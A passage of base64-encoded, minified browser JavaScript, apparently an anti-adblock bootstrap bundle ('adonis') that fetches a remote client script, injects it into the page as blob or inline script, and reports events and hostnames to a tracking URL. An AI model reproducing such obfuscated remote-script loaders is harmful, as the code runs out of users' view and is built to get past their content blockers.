nQoImJvb3RzdHJhcC5odHRwLnN1ZXpfb3BlbmVkIiksZX0pWyJjYXRjaCJdKGZ1bmN0aW9uKGUpe3Rocm93IGUgaW5zdGFuY2VvZiBmLlhockJsb2NrRXJyb3ImJnNbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAuc3Vlel9ibG9ja2VkIiksZX0pfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLmxvYWRPbmNlPW8sbi5sb2FkPWk7dmFyIGE9ZSg0KSxjPXIoYSksdT1lKDE1KSxzPXIodSksbD1lKDE4KSxkPWUoMTIpLGY9ZSg5KSxwPWUoMTMpfSx7MTI6MTIsMTM6MTMsMTU6MTUsMTg6MTgsNDo0LDk6OX1dLDExOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7cmV0dXJuIGUmJmUuX19lc01vZHVsZT9lOnsiZGVmYXVsdCI6ZX19ZnVuY3Rpb24gbygpe3ZhciBlPSJsb2FkZXJzL2NhY2hlL3hociI7cmV0dXJuIGQubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBTdGFydGluZyBYSFIgbG9hZGVyIiksKDAsbC5yZXF1ZXN0KShjWyJkZWZhdWx0Il0uQURPTklTX0NMSUVOVF9GRVRDSF9VUkwpLnRoZW4oZnVuY3Rpb24odCl7ZC5sb2dnZXIuZGVidWcoIlsiK2UrIl06IFN1Y2Nlc3NmdWxseSBmZXRjaGVkIGFkb25pcy1jbGllbnQgb3ZlciBYSFIiKTt2YXIgbj17ImFkb25pcy1jbGllbnQtdmVyc2lvbiI6bnVsbH07dHJ5e25bImNhY2hlLWNvbnRyb2wiXT10LmdldFJlc3BvbnNlSGVhZGVyKCJjYWNoZS1jb250cm9sIil9Y2F0Y2gocil7fXJldHVybntzb3VyY2U6dC5yZXNwb25zZVRleHQsbWV0YTpufX0pWyJjYXRjaCJdKGZ1bmN0aW9uKHQpe3Rocm93IGQubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBGYWlsZWQgdG8gZmV0Y2ggYWRvbmlzLWNsaWVudCBvdmVyIFhIUiA8Iit0KyI+IiksMD09PXQucmVxLnN0YXR1cz9uZXcgZi5YaHJCbG9ja0Vycm9yOm5ldyBFcnJvcigiVW5leHBlY3RlZCBlcnJvciBwZXJmb3JtaW5nIHN0YXR1cyBjaGVjayByZXF1ZXN0LCBzdGF0dXMtY29kZSA9IDwiK3QucmVxLnN0YXR1cysiPiIpfSl9ZnVuY3Rpb24gaSgpe3JldHVybiBvKClbImNhdGNoIl0oZnVuY3Rpb24oZSl7cmV0dXJuIGQubG9nZ2VyLmRlYnVnKCJmYWlsZWQgdG8gbG9hZCBhZG9uaXMtY2xpZW50IG92ZXIgaHR0cCIsZSksc1siZGVmYXVsdCJdLnJlcG9ydEV2ZW50KCJib290c3RyYXAuY2xpZW50X2h0dHBfZmV0Y2hfZXJyb3IiKSx7c291cmNlOm51bGwsbWV0YTp7fX19KX1PYmplY3QuZGVmaW5lUHJvcGVydHkobiwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSksbi5sb2FkPW8sbi5sb2FkSWdub3JpbmdFcnJvcnM9aTt2YXIgYT1lKDQpLGM9cihhKSx1PWUoMTUpLHM9cih1KSxsPWUoMTgpLGQ9ZSgxMiksZj1lKDkpfSx7MTI6MTIsMTU6MTUsMTg6MTgsNDo0LDk6OX1dLDEyOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7cmV0dXJuIGUmJmUuX19lc01vZHVsZT9lOnsiZGVmYXVsdCI6ZX19dmFyIG89ZSg0KSxpPXIobyksYT1lKDI2KSxjPSgwLGEuY3JlYXRlKSh7bGV2ZWw6aVsiZGVmYXVsdCJdLkxPR19MRVZFTH0pO3QuZXhwb3J0cz17bG9nZ2VyOmMsc3VlekxvZ2dlcjpjfX0sezI2OjI2LDQ6NH1dLDEzOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSx0LG4pe2lmKEFycmF5LmlzQXJyYXkoZSkmJjA9PT1lLmxlbmd0aClyZXR1cm4gUHJvbWlzZS5yZWplY3Qobik7dD10fHwwO3ZhciBpPWVbMF07cmV0dXJuIGU9ZS5zbGljZSgxKSxpKClbImNhdGNoIl0oZnVuY3Rpb24obil7cmV0dXJuIG8odCkudGhlbihmdW5jdGlvbihvKXtyZXR1cm4gcihlLHQsbil9KX0pfWZ1bmN0aW9uIG8oZSl7cmV0dXJuIG5ldyBQcm9taXNlKGZ1bmN0aW9uKHQsbil7c2V0VGltZW91dChmdW5jdGlvbihlKXtyZXR1cm4gdCgpfSxlKX0pfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLmNoYWluPXJ9LHt9XSwxNDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUsdCl7YS5kZWJ1ZygiaW5zZXJpbmcgYmxvYiIpO3ZhciBuPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO24uc3JjPWUsdCYmKG4uaW50ZWdyaXR5PXQpLGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobil9ZnVuY3Rpb24gbyhlLHQpe3ZhciBuPW5ldyB3aW5kb3cuWE1MSHR0cFJlcXVlc3Q7dHJ5e24ub3BlbigiR0VUIixlLCEwKSxuLmFkZEV2ZW50TGlzdGVuZXIoInJlYWR5c3RhdGVjaGFuZ2UiLGZ1bmN0aW9uKGUpezQ9PT1uLnJlYWR5U3RhdGUmJjA9PT1uLnN0YXR1cyYmaSh0KX0pLG4uc2VuZCgpfWNhdGNoKHIpe2Eud2FybigiRmFsbGluZyBiYWNrIHRvIGluc2VydGluZyBpbmxpbmUgc2NyaXB0IiksaSh0KX19ZnVuY3Rpb24gaShlKXt2YXIgdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTt0LmlubmVySFRNTD1lLGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQodCl9dmFyIGE9ZSgxMikubG9nZ2VyO3QuZXhwb3J0cz17aW5zZXJ0QmxvYlNjcmlwdDpyLHRlc3RCbG9iQW5kSW5zZXJ0RmFsbGJhY2s6byxpbnNlcnRJbmxpbmVTY3JpcHQ6aX19LHsxMjoxMn1dLDE1OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7dmFyIHQ9bmV3IFhNTEh0dHBSZXF1ZXN0LG49W3MuUkVQT1JUSU5HX1VSTCxlXS5qb2luKCIiKTt0Lm9wZW4oIkdFVCIsbiwhMCksdC5zZW5kKCl9ZnVuY3Rpb24gbyhlKXtzLlJFUE9SVF9FUlJPUlMmJnIoIi9hZG9uaXNfZXJyb3I/ZT0iK2UudG9TdHJpbmcoKSsiJndlYnNpdGU9Iit3aW5kb3cubG9jYXRpb24uaG9zdG5hbWUpfWZ1bmN0aW9uIGkoKXtyZXR1cm4gbnVsbCE9d2luZG93LkFET05JU19CT09UU1RSQVBfU1RBVFM/d2luZG93LkFET05JU19CT09UU1RSQVBfU1RBVFM9PT0hMDpNYXRoLnJhbmRvbSgpPHMuUkVQT1JUSU5HX1JBVEV9ZnVuY3Rpb24gYShlLHQpe2lmKGMoZSksaSgpKXt2YXIgbj17d2Vic2l0ZTp3aW5kb3cubG9jYXRpb24uaG9zdG5hbWUsa2V5OmV9O251bGwhPXQmJihuLnF1YW50aXR5PXQpLHIoWyIvYWRvbmlzX2V2ZW50Lz9ldmVudD0iLEpTT04uc3RyaW5naWZ5KG4pXS5qb2luKCIiKSl9fWZ1bmN0aW9uIGMoZSl7dmFyIHQ9e2tleTplLHRpbWVfbXM6TWF0aC5yb3VuZCh3aW5kb3cucGVyZm9ybWFuY2Uubm93KCkpLHdlYnNpdGU6d2luZG93LmxvY2F0aW9uLmhvc3RuYW1lfTtkLnB1c2godCl9ZnVuY3Rpb24gdSgpe2wuZGVmaW5lUmVhZE9ubHlQcm9wZXJ0eSgiYWRvbmlzQm9vdHN0cmFwVGltaW5nIixkKX12YXIgcz1lKDQpLGw9ZSgxNyksZD1bXTt0LmV4cG9ydHM9e3JlcG9ydEVycm9yOm8scmVwb3J0RXZlbnQ6YSxzYXZlVGltaW5nOnUsc2hvdWxkUmVwb3J0Oml9fSx7MTc6MTcsNDo0fV0sMTY6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlKXt2YXIgdD0vYW5kcm9pZHxpcGhvbmUvZ2ksbj0vQ2hyb21lXC8oXFMpKyBTYWZhcmlcLyhcUykrJC9naSxyPS9cKSBHZWNrb1wvKFxTKSsgRmlyZWZveFwvKFxTKSskL2dpLG89L2xpa2UgR2Vja28uP1wpIFZlcnNpb25cLyhcUykrIFNhZmFyaVwvKFxTKSskL2dpO3JldHVybiBlLnNlYXJjaCh0KT09PS0xJiYoZS5zZWFyY2gobik+LTF8fGUuc2VhcmNoKHIpPi0xfHxlLnNlYXJjaChvKT4tMSl9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG5bImRlZmF1bHQiXT1yfSx7fV0sMTc6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlLHQpe3RyeXtPYmplY3QuZGVmaW5lUHJvcGVydHkod2luZG93LGUse3ZhbHVlOnQsd3JpdGFibGU6ITF9KX1jYXRjaChuKXtvLndhcm4oIkNhbm5vdCBkZWZpbmUgcmVhZC1vbmx5IHByb3BlcnR5IG9mIHdpbmRvdyBvYmplY3Q6ICIrbil9fXZhciBvPWUoMTIpLmxvZ2dlcixpPWZ1bmN0aW9uKGUpeyJsb2FkaW5nIiE9PWRvY3VtZW50LnJlYWR5U3RhdGU/ZSgpOmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIkRPTUNvbnRlbnRMb2FkZWQiLGUpfTt0LmV4cG9ydHM9e2RlZmluZVJlYWRPbmx5UHJvcGVydHk6cixyZWFkeTppfX0sezEyOjEyfV0sMTg6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlKXtyZXR1cm4gZSYmZS5fX2VzTW9kdWxlP2U6eyJkZWZhdWx0IjplfX1mdW5jdGlvbiBvKGUsdCl7aWYoIShlIGluc3RhbmNlb2YgdCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiQ2Fubm90IGNhbGwgYSBjbGFzcyBhcyBhIGZ1bmN0aW9uIil9ZnVuY3Rpb24gaShlLHQpe2lmKCFlKXRocm93IG5ldyBSZWZlcmVuY2VFcnJvcigidGhpcyBoYXNuJ3QgYmVlbiBpbml0aWFsaXNlZCAtIHN1cGVyKCkgaGFzbid0IGJlZW4gY2FsbGVkIik7cmV0dXJuIXR8fCJvYmplY3QiIT10eXBlb2YgdCYmImZ1bmN0aW9uIiE9dHlwZW9mIHQ/ZTp0fWZ1bmN0aW9uIGEoZSx0KXtpZigiZnVuY3Rpb24iIT10eXBlb2YgdCYmbnVsbCE9PXQpdGhyb3cgbmV3IFR5cGVFcnJvcigiU3VwZXIgZXhwcmVzc2lvbiBtdXN0IGVpdGhlciBiZSBudWxsIG9yIGEgZnVuY3Rpb24sIG5vdCAiK3R5cGVvZiB0KTtlLnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKHQmJnQucHJvdG90eXBlLHtjb25zdHJ1Y3Rvcjp7dmFsdWU6ZSxlbnVtZXJhYmxlOiExLHdyaXRhYmxlOiEwLGNvbmZpZ3VyYWJsZTohMH19KSx0JiYoT2JqZWN0LnNldFByb3RvdHlwZU9mP09iamVjdC5zZXRQcm90b3R5cGVPZihlLHQpOmUuX19wcm90b19fPXQpfWZ1bmN0aW9uIGMoZSl7dmFyIHQ9YXJndW1lbnRzLmxlbmd0aD4xJiZ2b2lkIDAhPT1hcmd1bWVudHNbMV0/YXJndW1lbnRzWzFdOiJHRVQiLG49YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOm51bGwscj1hcmd1bWVudHMubGVuZ3RoPjMmJnZvaWQgMCE9PWFyZ3VtZW50c1szXT9hcmd1bWVudHNbM106e307cmV0dXJuIG5ldyB3aW5kb3cuUHJvbWlzZShmdW5jdGlvbihvLGkpe3ZhciBhPW5ldyB3aW5kb3cuWE1MSHR0cFJlcXVlc3Q7YS5vcGVuKHQsZSwhMCk7Zm9yKHZhciBjIGluIHIpe3ZhciB1PXJbY107YS5zZXRSZXF1ZXN0SGVhZGVyKGMsdSl9YS5vbmxvYWQ9ZnVuY3Rpb24oKXthLnN0YXR1cz49NDAwP2kobmV3IGwoYSwiVW5leHBlY3RlZCBzdGF0dXMgY29kZSIpKTpvKGEpfSxhLm9uZXJyb3I9ZnVuY3Rpb24oKXtpKG5ldyBsKGEsIkVycm9yIGVzdGFibGlzaGluZyBjb25uZWN0aW9uIikpfSxhLnNlbmQobil9KX1PYmplY3QuZGVmaW5lUHJvcGVydHkobiwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSksbi5YaHJSZXF1ZXN0RXJyb3I9dm9pZCAwLG4ucmVxdWVzdD1jO3ZhciB1PWUoMTkpLHM9cih1KSxsPW4uWGhyUmVxdWVzdEVycm9yPWZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHQoZSxuKXtvKHRoaXMsdCk7dmFyIHI9aSh0aGlzLCh0Ll9fcHJvdG9fX3x8T2JqZWN0LmdldFByb3RvdHlwZU9mKHQpKS5jYWxsKHRoaXMsbikpO3JldHVybiByLnJlcT1lLHJ9cmV0dXJuIGEodCxlKSx0fShzWyJkZWZhdWx0Il0pfSx7MTk6MTl9XSwxOTpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUsdCl7aWYoIShlIGluc3RhbmNlb2YgdCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiQ2Fubm90IGNhbGwgYSBjbGFzcyBhcyBhIGZ1bmN0aW9uIil9ZnVuY3Rpb24gbyhlLHQpe2lmKCFlKXRocm93IG5ldyBSZWZlcmVuY2VFcnJvcigidGhpcyBoYXNuJ3QgYmVlbiBpbml0aWFsaXNlZCAtIHN1cGVyKCkgaGFzbid0IGJlZW4gY2FsbGVkIik7cmV0dXJuIXR8fCJvYmplY3QiIT10eXBlb2YgdCYmImZ1bmN0aW9uIiE9dHlwZW9mIHQ/ZTp0fWZ1bmN0aW9uIGkoZSx0KXtpZigiZnVuY3Rpb24iIT10eXBlb2YgdCYmbnVsbCE9PXQpdGhyb3cgbmV3IFR5cGVFcnJvcigiU3VwZXIgZXhwcmVzc2lvbiBtdXN0IGVpdGhlciBiZSBudWxsIG9yIGEgZnVuY3Rpb24sIG5vdCAiK3R5cGVvZiB0KTtlLnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKHQmJnQucHJvdG90eXBlLHtjb25zdHJ1Y3Rvcjp7dmFsdWU6ZSxlbnVtZXJhYmxlOiExLHdyaXRhYmxlOiEwLGNvbmZpZ3VyYWJsZTohMH19KSx0JiYoT2JqZWN0LnNldFByb3RvdHlwZU9mP09iamVjdC5zZXRQcm90b3R5cGVPZihlLHQpOmUuX19wcm90b19fPXQpfWZ1bmN0aW9uIGEoZSl7ZnVuY3Rpb24gdCgpe2UuYXBwbHkodGhpcyxhcmd1bWVudHMpfXJldHVybiB0LnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKGUucHJvdG90eXBlLHtjb25zdHJ1Y3Rvcjp7dmFsdWU6ZSxlbnVtZXJhYmxlOiExLHdyaXRhYmxlOiEwLGNvbmZpZ3VyYWJsZTohMH19KSxPYmplY3Quc2V0UHJvdG90eXBlT2Y/T2JqZWN0LnNldFByb3RvdHlwZU9mKHQsZSk6dC5fX3Byb3RvX189ZSx0fU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KTt2YXIgYz1mdW5jdGlvbihlKXtmdW5jdGlvbiB0KCl7dmFyIGU9YXJndW1lbnRzLmxlbmd0aD4wJiZ2b2lkIDAhPT1hcmd1bWVudHNbMF0/YXJndW1lbnRzWzBdOiIiO3IodGhpcyx0KTt2YXIgbj1vKHRoaXMsKHQuX19wcm90b19ffHxPYmplY3QuZ2V0UHJvdG90eXBlT2YodCkpLmNhbGwodGhpcyxlKSk7cmV0dXJuIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJtZXNzYWdlIix7Y29uZmlndXJhYmxlOiEwLGVudW1lcmFibGU6ITEsdmFsdWU6ZSx3cml0YWJsZTohMH0pLE9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJuYW1lIix7Y29uZmlndXJhYmxlOiEwLGVudW1lcmFibGU6ITEsdmFsdWU6bi5jb25zdHJ1Y3Rvci5uYW1lLHdyaXRhYmxlOiEwfSksRXJyb3IuaGFzT3duUHJvcGVydHkoImNhcHR1cmVTdGFja1RyYWNlIik/KEVycm9yLmNhcHR1cmVTdGFja1RyYWNlKG4sbi5jb25zdHJ1Y3RvciksbyhuKSk6KE9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJzdGFjayIse2NvbmZpZ3VyYWJsZTohMCxlbnVtZXJhYmxlOiExLHZhbHVlOm5ldyBFcnJvcihlKS5zdGFjayx3cml0YWJsZTohMH0pLG4pfXJldHVybiBpKHQsZSksdH0oYShFcnJvcikpO25bImRlZmF1bHQiXT1jLHQuZXhwb3J0cz1uWyJkZWZhdWx0Il19LHt9XSwyMDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUpe3JldHVybiBlJiZlLl9fZXNNb2R1bGU/ZTp7ImRlZmF1bHQiOmV9fWZ1bmN0aW9uIG8oZSl7cmV0dXJuIGNbImRlZmF1bHQiXS5yZXBsYWNlKCJ7e1RJVExFfX0iLGUudGl0bGUpfWZ1bmN0aW9uIGkoZSl7ZS5kb2N1bWVudEVsZW1lbnQuaW5uZXJIVE1MPW8oZSl9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG4uZGlzcGxheU1lc3NhZ2U9byxuLnJlcGxhY2VDb250ZW50PWk7dmFyIGE9ZSgyMSksYz1yKGEpfSx7MjE6MjF9XSwyMTpbZnVuY3Rpb24oZSx0LG4pe3QuZXhwb3J0cz0nPGhlYWQ+XG4gICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPlxuICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLG1heGltdW0tc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIj5cbiAgICA8dGl0bGU+e3tUSVRMRX19PC90aXRsZT5cbiAgICA8c3R5bGU+XG4gICAgICBodG1sLCBib2R5IHtcbiAgICAgICAgYmFja2dyb3VuZDogI0VGRUZFRjtcbiAgICAgICAgZm9udC1mYW1pbHk6ICJIZWx2ZXRpY2EgTmV1ZSIsIEhlbHZldGljYSwgQXJpYWwsIHNhbnMtc2VyaWY7XG4gICAgICAgIGhlaWdodDogMTAwJVxuICAgICAgfVxuXG4gICAgICAjbWFpbi1jb250ZW50IHtcbiAgICAgICAgaGVpZ2h0OiAxMDAlO1xuICAgICAgfVxuXG4gICAgICAjbWFpbi1jb250ZW50ID4gZGl2ICB7XG4gICAgICAgIG1heC13aWR0aDogODAwcHg7XG4gICAgICAgIG1pbi13aWR0aDogMjAwcHg7XG5cbiAgICAgICAgbWFyZ2luOiAwIGF1dG87XG4gICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTtcbiAgICAgICAgdG9wOiA1MCU7XG4gICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTtcbiAgICAgIH1cbiAgICA8L3N0eWxlPlxuPC9oZWFkPlxuPGJvZHk+XG5cdFx0PGRpdiBpZD0ibWFpbi1jb250ZW50Ij5cblx0XHRcdFx0PGRpdj5cblx0XHRcdFx0XHRcdDxoMT5Tb21ldGhpbmcgaW50ZXJmZXJlZCB3aXRoIHRoaXMgd2Vic2l0ZSBsb2FkaW5nPC9oMT5cblx0XHRcdFx0XHRcdDxwPlRoaXMgY291bGQgYmUgYSB0ZW1wb3JhcnkgcHJvYmxlbSB3aXRoIHlvdXIgbmV0d29yaywgb3IgZHVlIHRvIHlvdXIgYWRibG9ja2VyPC9wPlxuXHRcdFx0XHRcdFx0PHA+VHJ5OjwvcD5cblx0XHRcdFx0XHRcdDx1bD5cblx0XHRcdFx0XHRcdFx0XHQ8bGk+Q2hlY2sgeW91ciBpbnRlcm5ldCBjb25uZWN0aW9uIGFuZCByZWxvYWQgdGhlIHBhZ2U8L2xpPlxuXHRcdFx0XHRcdFx0XHRcdDxsaT5JZiB5b3UgYXJlIHVzaW5nIGFuIGFkYmxvY2tlciBkaXNhYmxlIGl0IGJ5IGNsaWNraW5nIG9uIHRoZSBhZGJsb2NrIGljb24gaW4geW91ciBicm93c2VyIHRvb2xiYXI8L2xpPlxuXHRcdFx0XHRcdFx0XHRcdDxsaT5JZiB0aGUgcHJvYmxlbSBwZXJzaXN0cywgY29uc2lkZXIgbGVhdmluZyBhIG1lc3NhZ2Ugb24gdGhlIDxhIGhyZWY9Imh0dHBzOi8vZm9ydW1zLmxhbmlrLnVzLyIgdGFyZ2V0PSJfQkxBTksiPmFkYmxvY2sgdXNlciBmb3J1bXM8L2E+XG5cdFx0XHRcdFx0XHRcdFx0PC9saT5cblx0XHRcdFx0XHRcdDwvdWw+XG5cdFx0XHRcdDwvZGl2PlxuXHRcdDwvZGl2PlxuPC9ib2R5PlxuJ30se31dLDIyOltmdW5jdGlvbihlLHQsbil7ZnVuY3Rpb24gcihlKXsicGVyZm9ybWFuY2UiaW4gZXx8KGUucGVyZm9ybWFuY2U9e30pO3ZhciB0PWUucGVyZm9ybWFuY2U7ZS5wZXJmb3JtYW5jZS5ub3c9dC5ub3d8fHQubW96Tm93fHx0Lm1zTm93fHx0Lm9Ob3d8fHQud2Via2l0Tm93fHxEYXRlLm5vd3x8ZnVuY3Rpb24oKXtyZXR1cm4obmV3IERhdGUpLmdldFRpbWUoKX19cihzZWxmKX0se31dLDIzOltmdW5jdGlvbihlLHQsbil7dC5leHBvcnRzPVsiY29tIiwibmV0IiwiZnIiLCJjby51ayIsImRlIiwidHYiLCJ0b2RheSIsIm9yZyIsImluZm8iLCJpZSIsImJhIiwiZ2ciXX0se31dLDI0OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO3ZhciByPWUoMjUpLG89e307by5ydWxlcz1lKDIzKS5tYXAoZnVuY3Rpb24oZSl7cmV0dXJue3J1bGU6ZSxzdWZmaXg6ZS5yZXBsYWNlKC9eKFwqXC58XCEpLywiIiksd2lsZGNhcmQ6IioiPT09ZS5jaGFyQXQoMCksZXhjZXB0aW9uOiIhIj09PWUuY2hhckF0KDApfX0pLG8uZW5kc1dpdGg9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gZS5pbmRleE9mKHQsZS5sZW5ndGgtdC5sZW5ndGgpIT09LTF9LG8uZmluZFJ1bGU9ZnVuY3Rpb24oZSl7dmFyIHQ9ci50b0FTQ0lJKGUpO3JldHVybiBvLnJ1bGVzLnJlZHVjZShmdW5jdGlvbihlLG4pe3ZhciBpPXIudG9BU0NJSShuLnN1ZmZpeCk7cmV0dXJuIG8uZW5kc1dpdGgodCwiLiIraSl8fHQ9PT1pP246ZX0sbnVsbCl9LG4uZXJyb3JDb2Rlcz17RE9NQUlOX1RPT19TSE9SVDoiRG9tYWluIG5hbWUgdG9vIHNob3J0LiIsRE9NQUlOX1RPT19MT05HOiJEb21haW4gbmFtZSB0b28gbG9uZy4gSXQgc2hvdWxkIGJlIG5vIG1vcmUgdGhhbiAyNTUgY2hhcnMuIixMQUJFTF9TVEFSVFNfV0lUSF9EQVNIOiJEb21haW4gbmFtZSBsYWJlbCBjYW4gbm90IHN0YXJ0IHdpdGggYSBkYXNoLiIsTEFCRUxfRU5EU19XSVRIX0RBU0g6IkRvbWFpbiBuYW1lIGxhYmVsIGNhbiBub3QgZW5kIHdpdGggYSBkYXNoLiIsTEFCRUxfVE9PX0xPTkc6IkRvbWFpbiBuYW1lIGxhYmVsIHNob3VsZCBiZSBhdCBtb3N0IDYzIGNoYXJzIGxvbmcuIixMQUJFTF9UT09fU0hPUlQ6IkRvbWFpbiBuYW1lIGxhYmVsIHNob3VsZCBiZSBhdCBsZWFzdCAxIGNoYXJhY3RlciBsb25nLiIsTEFCRUxfSU5WQUxJRF9DSEFSUzoiRG9tYWluIG5hbWUgbGFiZWwgY2FuIG9ubHkgY29udGFpbiBhbHBoYW51bWVyaWMgY2hhcmFjdGVycyBvciBkYXNoZXMuIn0sby52YWxpZGF0ZT1mdW5jdGlvbihlKXt2YXIgdD1yLnRvQVNDSUkoZSk7aWYodC5sZW5ndGg8MSlyZXR1cm4iRE9NQUlOX1RPT19TSE9SVCI7aWYodC5sZW5ndGg+MjU1KXJldHVybiJET01BSU5fVE9PX0xPTkciO2Zvcih2YXIgbixvPXQuc3BsaXQoIi4iKSxpPTA7aTxvLmxlbmd0aDsrK2kpe2lmKG49b1tpXSwhbi5sZW5ndGgpcmV0dXJuIkxBQkVMX1RPT19TSE9SVCI7aWYobi5sZW5ndGg+NjMpcmV0dXJuIkxBQkVMX1RPT19MT05HIjtpZigiLSI9PT1uLmNoYXJBdCgwKSlyZXR1cm4iTEFCRUxfU1RBUlRTX1dJVEhfREFTSCI7aWYoIi0iPT09bi5jaGFyQXQobi5sZW5ndGgtMSkpcmV0dXJuIkxBQkVMX0VORFNfV0lUSF9EQVNIIjtpZighL15bYS16MC05XC1dKyQvLnRlc3QobikpcmV0dXJuIkxBQkVMX0lOVkFMSURfQ0hBUlMifX0sbi5wYXJzZT1mdW5jdGlvbihlKXtpZigic3RyaW5nIiE9dHlwZW9mIGUpdGhyb3cgbmV3IFR5cGVFcnJvcigiRG9tYWluIG5hbWUgbXVzdCBiZSBhIHN0cmluZy4iKTt2YXIgdD1lLnNsaWNlKDApLnRvTG93ZXJDYXNlKCk7Ii4iPT09dC5jaGFyQXQodC5sZW5ndGgtMSkmJih0PXQuc2xpY2UoMCx0Lmxlbmd0aC0xKSk7dmFyIGk9by52YWxpZGF0ZSh0KTtpZihpKXJldHVybntpbnB1dDplLGVycm9yOnttZXNzYWdlOm4uZXJyb3JDb2Rlc1tpXSxjb2RlOml9fTt2YXIgYT17aW5wdXQ6ZSx0bGQ6bnVsbCxzbGQ6bnVsbCxkb21haW46bnVsbCxzdWJkb21haW46bnVsbCxsaXN0ZWQ6ITF9LGM9dC5zcGxpdCgiLiIpO2lmKCJsb2NhbCI9PT1jW2MubGVuZ3RoLTFdKXJldHVybiBhO3ZhciB1PWZ1bmN0aW9uKCl7cmV0dXJuL3huLS0vLnRlc3QodCk/KGEuZG9tYWluJiYoYS5kb21haW49ci50b0FTQ0lJKGEuZG9tYWluKSksYS5zdWJkb21haW4mJihhLnN1YmRvbWFpbj1yLnRvQVNDSUkoYS5zdWJkb21haW4pKSxhKTphfSxzPW8uZmluZFJ1bGUodCk7aWYoIXMpcmV0dXJuIGMubGVuZ3RoPDI/YTooYS50bGQ9Yy5wb3AoKSxhLnNsZD1jLnBvcCgpLGEuZG9tYWluPVthLnNsZCxhLnRsZF0uam9pbigiLiIpLGMubGVuZ3RoJiYoYS5zdWJkb21haW49Yy5wb3AoKSksdSgpKTthLmxpc3RlZD0hMDt2YXIgbD1zLnN1ZmZpeC5zcGxpdCgiLiIpLGQ9Yy5zbGljZSgwLGMubGVuZ3RoLWwubGVuZ3RoKTtyZXR1cm4gcy5leGNlcHRpb24mJmQucHVzaChsLnNoaWZ0KCkpLGQubGVuZ3RoPyhzLndpbGRjYXJkJiZsLnVuc2hpZnQoZC5wb3AoKSksZC5sZW5ndGg/KGEudGxkPWwuam9pbigiLiIpLGEuc2xkPWQucG9wKCksYS5kb21haW49W2Euc2xkLGEudGxkXS5qb2luKCIuIiksZC5sZW5ndGgmJihhLnN1YmRvbWFpbj1kLmpvaW4oIi4iKSksdSgpKTp1KCkpOnUoKX0sbi5nZXQ9ZnVuY3Rpb24oZSl7cmV0dXJuIGU/bi5wYXJzZShlKS5kb21haW58fG51bGw6bnVsbH0sbi5pc1ZhbGlkPWZ1bmN0aW9uKGUpe3ZhciB0PW4ucGFyc2UoZSk7cmV0dXJuIEJvb2xlYW4odC5kb21haW4mJnQubGlzdGVkKX19LHsyMzoyMywyNToyNX1dLDI1OltmdW5jdGlvbihlLHQsbil7KGZ1bmN0aW9uKGUpeyFmdW5jdGlvbihyKXtmdW5jdGlvbiBvKGUpe3Rocm93IG5ldyBSYW5nZUVycm9yKGpbZV0pfWZ1bmN0aW9uIGkoZSx0KXtmb3IodmFyIG49ZS5sZW5ndGgscj1bXTtuLS07KXJbbl09dChlW25dKTtyZXR1cm4gcn1mdW5jdGlvbiBhKGUsdCl7dmFyIG49ZS5zcGxpdCgiQCIpLHI9IiI7bi5sZW5ndGg+MSYmKHI9blswXSsiQCIsZT1uWzFdKSxlPWUucmVwbGFjZSh4LCIuIik7dmFyIG89ZS5zcGxpdCgiLiIpLGE9aS